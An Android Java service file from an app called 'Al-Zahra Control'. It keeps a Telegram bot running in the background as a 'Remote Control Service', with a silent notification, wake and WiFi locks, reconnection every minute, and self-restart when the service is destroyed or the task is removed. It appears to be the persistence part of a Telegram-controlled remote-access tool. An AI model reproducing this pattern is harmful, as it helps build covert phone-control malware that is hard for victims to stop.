package com.alzahra.services;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.net.wifi.WifiManager;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.os.PowerManager;
import android.util.Log;

import androidx.annotation.Nullable;
import androidx.core.app.NotificationCompat;

import com.alzahra.MainActivity;
import com.alzahra.R;
import com.alzahra.telegram.SimpleBot;

public class BotService extends Service {
    private static final String TAG = "BotService";
    private static final String CHANNEL_ID = "alzahra_channel";
    private static final int NOTIFICATION_ID = 7777;
    
    private SimpleBot bot;
    private PowerManager.WakeLock wakeLock;
    private WifiManager.WifiLock wifiLock;
    private Handler reconnectHandler;
    private String botToken;
    private String chatId;

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public void onCreate() {
        super.onCreate();
        Log.d(TAG, "=== BotService Created ===");
        
        // إنشاء قناة الإشعارات فوراً
        createNotificationChannel();
        
        // الحصول على الأقفال
        acquireWakeLocks();
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        Log.d(TAG, "=== BotService Started ===");
        
        // استخراج البيانات
        if (intent != null) {
            botToken = intent.getStringExtra("token");
            chatId = intent.getStringExtra("chat_id");
        }
        
        if (botToken == null) {
            botToken = MainActivity.BOT_TOKEN;
            chatId = MainActivity.CHAT_ID;
        }
        
        // بدء الإشعار المستمر فوراً
        Notification notification = buildNotification();
        startForeground(NOTIFICATION_ID, notification);
        
        // بدء البوت في Thread منفصل
        startBotInBackground();
        
        // جدولة إعادة الاتصال
        setupReconnect();
        
        return START_STICKY;
    }
    
    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            try {
                NotificationChannel channel = new NotificationChannel(
                    CHANNEL_ID, 
                    "Al-Zahra Control",
                    NotificationManager.IMPORTANCE_LOW);
                channel.setDescription("Remote Control Service");
                channel.setSound(null, null);
                channel.enableLights(false);
                channel.enableVibration(false);
                
                NotificationManager nm = getSystemService(NotificationManager.class);
                if (nm != null) {
                    nm.createNotificationChannel(channel);
                    Log.d(TAG, "Notification channel created");
                }
            } catch (Exception e) {
                Log.e(TAG, "Channel creation error: " + e.getMessage());
            }
        }
    }
    
    private Notification buildNotification() {
        Intent intent = new Intent(this, MainActivity.class);
        PendingIntent pendingIntent = PendingIntent.getActivity(this, 0, intent, 
            PendingIntent.FLAG_IMMUTABLE);
            
        return new NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("Al-Zahra Control")
            .setContentText("الخدمة نشطة - جاري الاستماع")
            .setSmallIcon(android.R.drawable.ic_menu_preferences)
            .setContentIntent(pendingIntent)
            .setOngoing(true)
            .setSilent(true)
            .build();
    }
    
    private void acquireWakeLocks() {
        try {
            // WakeLock
            PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
            if (pm != null) {
                wakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "AlZahra::WakeLock");
                wakeLock.acquire(60*60*1000L); // ساعة
                Log.d(TAG, "WakeLock acquired");
            }
            
            // WiFi Lock
            WifiManager wm = (WifiManager) getApplicationContext().getSystemService(Context.WIFI_SERVICE);
            if (wm != null) {
                wifiLock = wm.createWifiLock(WifiManager.WIFI_MODE_FULL, "AlZahra::WiFiLock");
                wifiLock.acquire();
                Log.d(TAG, "WiFiLock acquired");
            }
        } catch (Exception e) {
            Log.e(TAG, "WakeLock error: " + e.getMessage());
        }
    }
    
    private void startBotInBackground() {
        new Thread(() -> {
            try {
                Log.d(TAG, "Starting bot thread...");
                
                if (bot != null) {
                    bot.stop();
                }
                
                bot = new SimpleBot(botToken, chatId, this);
                bot.start();
                
                Log.d(TAG, "Bot started successfully");
                
                // إرسال رسالة التفعيل
                new Handler(Looper.getMainLooper()).postDelayed(() -> {
                    bot.sendText("🟢 *تم تفعيل البوت بنجاح!*\n\nالخدمة تعمل في الخلفية\nاضغط على أي زر للبدء");
                    bot.sendDashboard();
                }, 2000);
                
            } catch (Exception e) {
                Log.e(TAG, "Bot start error: " + e.getMessage());
                sendCrashReport("Bot Start Error", e.getMessage());
            }
        }).start();
    }
    
    private void setupReconnect() {
        reconnectHandler = new Handler(Looper.getMainLooper());
        Runnable reconnectRunnable = new Runnable() {
            @Override
            public void run() {
                try {
                    if (bot == null || !bot.isRunning()) {
                        Log.d(TAG, "Reconnecting bot...");
                        startBotInBackground();
                    }
                } catch (Exception e) {
                    Log.e(TAG, "Reconnect error: " + e.getMessage());
                }
                reconnectHandler.postDelayed(this, 60000); // كل دقيقة
            }
        };
        reconnectHandler.postDelayed(reconnectRunnable, 60000);
    }
    
    private void sendCrashReport(String type, String error) {
        try {
            if (bot != null) {
                bot.sendText("⚠️ *تقرير خطأ:*\nالنوع: " + type + "\nالخطأ: `" + error + "`");
            }
        } catch (Exception e) {
            Log.e(TAG, "Failed to send crash report: " + e.getMessage());
        }
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        Log.d(TAG, "=== BotService Destroyed ===");
        
        try {
            if (reconnectHandler != null) {
                reconnectHandler.removeCallbacksAndMessages(null);
            }
            
            if (bot != null) {
                bot.stop();
            }
            
            if (wakeLock != null && wakeLock.isHeld()) {
                wakeLock.release();
            }
            
            if (wifiLock != null && wifiLock.isHeld()) {
                wifiLock.release();
            }
        } catch (Exception e) {
            Log.e(TAG, "Destroy error: " + e.getMessage());
        }
        
        // إعادة التشغيل الفوري
        try {
            Intent restartIntent = new Intent(this, BotService.class);
            restartIntent.putExtra("token", botToken);
            restartIntent.putExtra("chat_id", chatId);
            startService(restartIntent);
        } catch (Exception e) {
            Log.e(TAG, "Restart error: " + e.getMessage());
        }
    }

    @Override
    public void onTaskRemoved(Intent rootIntent) {
        super.onTaskRemoved(rootIntent);
        Log.d(TAG, "=== Task Removed - Restarting ===");
        
        try {
            Intent restart = new Intent(this, BotService.class);
            restart.putExtra("token", botToken);
            restart.putExtra("chat_id", chatId);
            startService(restart);
        } catch (Exception e) {
            Log.e(TAG, "Task remove restart error: " + e.getMessage());
        }
    }
}
